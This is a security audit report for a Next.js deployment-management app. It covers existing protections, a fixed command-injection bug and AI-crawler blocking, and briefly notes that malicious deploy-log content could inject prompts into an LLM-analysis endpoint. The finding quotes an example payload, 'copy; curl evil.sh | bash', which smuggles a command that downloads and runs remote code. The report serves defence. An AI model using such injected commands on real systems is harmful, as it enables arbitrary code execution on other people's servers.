# Security Audit — 2026-08-23

## Verified protections (already in place)

| Area | Status |
|---|---|
| Global API auth gate (`src/proxy.js`, Next 16 proxy/middleware) | ✅ All `/api/*` require a valid NextAuth JWT except an explicit allowlist |
| Allowlisted public routes self-verify | ✅ `deploy/webhook` (HMAC-SHA256 signature), `deploy/telegram` (401 checks), `firewall/agent-sync` (`x-agent-token`), `settings/database` + `deploy/trigger` (own `getServerSession` checks) |
| Security headers | ✅ `X-Content-Type-Options`, `X-Frame-Options: DENY`, `Referrer-Policy`; `poweredByHeader: false` |
| Webhook signature comparison | ✅ HMAC-SHA256, timing-safe |
| Secrets at rest | ✅ Zero-knowledge vault encryption for connection credentials (`src/utils/encryption.js`) |
| Dependency vulnerabilities (prod) | ✅ `npm audit --omit=dev` → 0 vulnerabilities |

## Vulnerabilities found & patched in this audit

### 1. Command injection via `action` parameter (HIGH) — FIXED
`POST /api/rclone/exec` interpolated the user-supplied `action` field **unquoted**
into a remote shell command (`"$RCLONE_BIN" ${action} ...`). An authenticated
attacker could send `action: "copy; curl evil.sh | bash"` to execute arbitrary
commands on any stored server connection.

**Fix:** strict allowlist (`sync | copy | move | check`) enforced before any
command construction (`src/app/api/rclone/exec/route.js`). `source`/`target`
were already properly single-quote escaped via the `quote()` helper.

## AI crawler / scraper protection (added 2026-08-23)

Three layers prevent high-tier AI models (GPT, Claude, Gemini-extended,
Perplexity, ByteDance, Meta, etc.) from harvesting site content:

1. **`public/robots.txt`** — explicit `Disallow: /` for 19 known AI bots
   (GPTBot, OAI-SearchBot, ChatGPT-User, ClaudeBot, Claude-Web, anthropic-ai,
   Google-Extended, CCBot, Bytespider, PerplexityBot/User, Amazonbot,
   Applebot-Extended, cohere-ai, Meta-ExternalAgent/Fetcher, Diffbot,
   ImagesiftBot, YouBot).
2. **Hard edge block in `src/proxy.js`** — requests whose User-Agent matches
   any of those bots get an immediate **403 Forbidden**, before auth or page
   rendering. This enforces the policy even for bots that ignore robots.txt.
3. **`X-Robots-Tag: noai, noimageai` header** on every response
   (`next.config.mjs`) — tells compliant AI systems not to use content for
   training or AI-generated images.

Note: user-agent blocking stops well-behaved crawlers; a determined attacker
can spoof a browser UA. The app's real data is behind authentication anyway,
so scraping exposure is limited to public pages.

## Notes on "AI hacking" (prompt-injection / LLM abuse)

The AI-analyze endpoint (`/api/deploy/ai-analyze`) sends deploy logs to an LLM.
Prompt injection via malicious log content can at worst influence the *text
summary* returned — the AI output is not executed as code or commands, so this
is low risk. Keep it that way: never feed LLM output into `exec`, eval, or
deployment commands.

## Remaining recommendations (need product decisions)

1. **Login rate limiting / lockout** — NextAuth credentials sign-in has no
   brute-force protection. Consider fail2ban on the reverse proxy.
2. **Content-Security-Policy** — currently absent. A strict CSP needs testing
   against inline scripts/WebRTC usage; add via `next.config.mjs` when ready.
3. **HTTPS in production** — ensures `__Secure-` session cookies apply.
4. **Rotate `NEXTAUTH_SECRET`** periodically; never commit `.env`.